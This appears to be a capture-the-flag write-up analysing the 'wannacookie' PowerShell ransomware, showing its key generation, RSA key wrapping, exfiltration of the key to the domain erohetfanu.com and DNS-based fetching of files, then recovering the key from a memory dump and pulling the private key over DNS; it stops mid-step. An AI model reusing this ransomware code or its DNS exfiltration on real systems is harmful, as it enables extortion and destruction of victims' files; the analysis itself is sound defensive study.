1. The non-minified version of the malware reads as follows:

```
 if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetf    $Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -jo    [array]$future_cookies = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile+'\Desktop'),$($env:userprofile+'\Documents'),$($env:userprof                    [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object wannacookiestener.Stop()r.Stop()rite($buffer, 0, $buffer.length)etfanu.com -Name ("$cookie_id.72616e736f6d697370616964.erohetfanu.com".trim()) -Type TXT).Strings

```

2. encryption key is generated with the following code:

```javascript
        $b_k = ([System.Text.Encoding]::Unicode.GetBytes(
            $(
                ([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''
             )
        )  | ? {$_ -ne 0x00});
```

3.

Here's how things are encypted (first), and decrypted
```
// Encryption settings

$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )
$Byte_key = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort {Get-Random})[0..15] -join ''))  | ? {$_ -ne 0x00})
$Hex_key = $(B2H $Byte_key)
$Key_Hash = $(Sha1 $Hex_key)

$Pub_key_encrypted_Key = (Pub_Key_Enc $Byte_key $pub_key).ToString()
$cookie_id = (send_key $Pub_key_encrypted_Key) ### Note the key is exfiltrated, sent to the server.
$date_time = (($(Get-Date).ToUniversalTime() | Out-String) -replace "`r`n")


[...]

// Decryption
} elseif ($received -eq 'GET /decrypt') {
    $akey = $Req.QueryString.Item("key")  # Key will be sent as querystring

    if ($Key_Hash -eq $(Sha1 $akey)) {
        $akey = $(H2B $akey)
        [array]$allcookies = $(Get-ChildItem -Path $($env:userprofile) -Recurse  -Filter *.wannacookie | where { ! $_.PSIsContainer } | Foreach-Object {$_.Fullname})
        enc_dec $akey $allcookies $false
        $html = "Files have been decrypted!"
        $close = $true
    } else {
        $html = "Invalid Key!"
    }

} elseif ($received -eq 'GET /close') {
```


4. The key seems to be exfiltratred (in `send_key`).
5. Pub_Key_Enc reads as follows:

```

function Pub_Key_Enc($key_bytes, [byte[]]$pub_bytes){
    $cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
    $cert.Import($pub_bytes)
    $encKey = $cert.PublicKey.Key.Encrypt($key_bytes, $true)
    return $(B2H $encKey)
}

```


6. The Sha1 hash is built as follows:

```
function Sha1([String] $String) {
    $SB = New-Object System.Text.StringBuilder
        [System.Security.Cryptography.HashAlgorithm]::Create("SHA1").ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
        [Void]$SB.Append($_.ToString("x2"))
    }
    $SB.ToString()
}

PS /> Sha1("asdasd")
85136c79cbf9fe36bb9d05d0639c70c265c18d37
PS /> "85136c79cbf9fe36bb9d05d0639c70c265c18d37".length
40

```

The SHA1 of the key is 40 characters long, and lowercase. Using the following filters, I've obtained:
```
1| LENGTH  len(variable_values) == 40
2| MATCHES  bool(re.search(r"^([a-z0-9]+)$",variable_values))

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print all
b0e59a5e0f00968856f22cff2d6226697535da5b

Variable Values #1 above ^
Type any key to go back and just Enter to Continue...

```

7. Now try to fetch the keys. The Hex key is composed of 16 bytes long, but encoded in Hexa, so 32 bytes. Upadte the filters and see what we can find.

```
================ Filters ================
1| MATCHES  bool(re.search(r"^([a-z0-9]+)$",variable_values))
2| LENGTH  len(variable_values) == 32

[i] 5 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: print all
033ecb2bc07a4d43b5ef94ed5a35d280
cf522b78d86c486691226b40aa69e95c
9e210fe47d09416682b841769c78b8a3
4ec4f0187cb04f4cb6973460dfe252df
27c87ef9bbda4f709f6b4002fa4af63c
```


We've found 5 possible keys which need to be tested against the SHA1 we obtained before.


8. None of those matched. So

```bash

================ Filters ================
1| MATCHES  bool(re.search(r"^([^ ])+$",variable_values))
2| LENGTH  len(variable_values) > 8

[i] 6706 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================

```

9. The actual variables won't be in RAM because of these lines:
```
Clear-variable -Name "Hex_key"
Clear-variable -Name "Byte_key"
```

10. Add functions `Pub_Key_Enc`, `get_over_dns` to a controlled script; run it and dump the variables.
The `$Pub_key_encrypted_Key` variable should be 512 characters long, hexa. There's a single match:

```
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
```


11. Originally `wannacookie.min.ps1` was available, and `wannacookie.ps1` was too. Same thing with `source.min.html` and `source.html`.
Is there any other file we may want to have? What about private certificates, like `server.crt`?

```bash
dig @erohetfanu.com 7365727665722e637274.erohetfanu.com TXT +noedns +short
"10"
```

So it seems the binary version of `66667272727869657268667865666B73` is the key used to decrypt the message above:


```
(SOME KEY) encrypted with PublicKey: =>
3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971


3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971
decrypted with PrivateKey=66667272727869657268667865666B73 =>

(SOME KEY)

```


12. The encryption type is RSA:
```
$pub_key = [System.Convert]::FromBase64String($(get_over_dns("7365727665722E637274") ) )

$cert = New-Object -TypeName System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.import($pub_key);
echo $cert.GetType();
echo $cert.PublicKey.GetType();
echo $cert.PublicKey.Key.GetType();


PS Z:\> .\decrypter.ps1

IsPublic IsSerial Name                                     BaseType
-------- -------- ----                                     --------
True     True     X509Certificate2                         System.Security.Cryptography.X509Certificates.X509Certificate
True     False    PublicKey                                System.Object
True     False    RSACryptoServiceProvider                 System.Security.Cryptography.RSA
```

13. Try to find the server.key file;
```
// 'server.key': { count: 14, name: '7365727665722e6b6579'} // 66667272727869657268667865666B73

// There are 14 pages:
dig +noedns +short @erohetfanu.com 7365727665722e6b6579.erohetfanu.com TXT;
"14"

// Use dns.js and retrieve the Private key; save it as private.pem:
// change dns.js to read server.key, then
node dns.js
cat *.txt > private.pem

```

13. Decrypt the text with OpenSSL:
